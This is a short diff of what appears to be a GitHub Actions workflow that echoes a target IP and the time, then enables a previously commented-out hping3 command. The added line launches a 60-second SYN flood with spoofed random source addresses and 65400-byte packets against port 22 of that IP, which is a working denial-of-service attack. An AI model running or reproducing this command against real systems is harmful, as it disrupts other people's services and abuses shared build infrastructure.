@@ -69,4 +69,4 @@ jobs:
           echo $IP
           echo "当前时间：$(date "+%Y-%m-%d %H:%M:%S")"
           # sudo timeout 60s hping3 -S --flood -V -d 65400 -p 22 -s 1000-65535 $IP
-          # sudo timeout 60s hping3 -S --flood -V -d 40 -p 22 --rand-source $IP
+          sudo timeout 60s hping3 -S --flood -V -d 65400 -p 22 --rand-source $IP
